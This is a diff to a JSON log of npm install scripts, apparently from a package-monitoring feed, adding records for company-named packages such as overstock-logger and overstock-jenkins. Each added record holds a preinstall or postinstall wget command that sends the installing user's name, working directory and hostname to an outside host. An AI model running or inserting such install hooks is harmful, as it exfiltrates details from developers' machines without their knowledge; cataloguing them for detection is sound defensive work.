@@ -1,5 +1,59 @@
 [
   {
+    "packageName": "ostk-otel-autoconfig",
+    "version": "2.3.2",
+    "scriptType": "postinstall",
+    "scriptContent": "wget \"https://z.wbx.lt/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"",
+    "previousVersion": null,
+    "timestamp": "2026-01-23T22:13:07.297Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "ostk-otel-autoconfig",
+    "version": "2.3.2",
+    "scriptType": "preinstall",
+    "scriptContent": "wget \"https://z.wbx.lt/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"",
+    "previousVersion": null,
+    "timestamp": "2026-01-23T22:13:07.296Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "overstock-logger",
+    "version": "3.8.2",
+    "scriptType": "postinstall",
+    "scriptContent": "wget \"https://z.wbx.lt/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"",
+    "previousVersion": null,
+    "timestamp": "2026-01-23T22:12:05.296Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "overstock-logger",
+    "version": "3.8.2",
+    "scriptType": "preinstall",
+    "scriptContent": "wget \"https://z.wbx.lt/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"",
+    "previousVersion": null,
+    "timestamp": "2026-01-23T22:12:05.294Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "overstock-jenkins",
+    "version": "1.3.4",
+    "scriptType": "postinstall",
+    "scriptContent": "wget \"https://z.wbx.lt/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"",
+    "previousVersion": null,
+    "timestamp": "2026-01-23T22:11:33.492Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "overstock-jenkins",
+    "version": "1.3.4",
+    "scriptType": "preinstall",
+    "scriptContent": "wget \"https://z.wbx.lt/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"",
+    "previousVersion": null,
+    "timestamp": "2026-01-23T22:11:33.489Z",
+    "issuesend": false
+  },
+  {
     "packageName": "overstock-component-library",
     "version": "4.2.3",
     "scriptType": "postinstall",
